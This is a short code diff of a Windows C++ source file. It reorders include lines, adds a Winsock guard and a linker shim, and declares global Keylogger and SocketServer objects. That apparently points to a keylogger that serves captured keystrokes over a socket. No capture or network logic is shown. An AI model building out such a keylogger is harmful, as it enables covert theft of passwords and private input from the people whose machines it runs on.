@@ -2,22 +2,29 @@
 //
 
 
-#include "stdafx.h"
+#ifndef _WINSOCKAPI_
+#define _WINSOCKAPI_
+#endif // !_WINSOCKAPI_
 #define WIN32_LEAN_AND_MEAN
-#include <windows.h>
+#ifndef WIN32_LEAN_AND_MEAN
+#endif // !WIN32_LEAN_AND_MEAN
+#include "stdafx.h"
 #include <string>
-#include <tchar.h>
-#include <stdio.h>
 #include <cstdlib>
 #include <memory>		
 #include <io.h>
 #include <fcntl.h>
 #include <thread>
+#include <tchar.h>
+#include <windows.h>
+#include <stdio.h>
 
 #include "Keylogger.h"
 #include "SocketServer.h"
 
 using namespace std;
+
+extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }
 
 shared_ptr<Keylogger> logger;
 shared_ptr<SocketServer> socketServer;
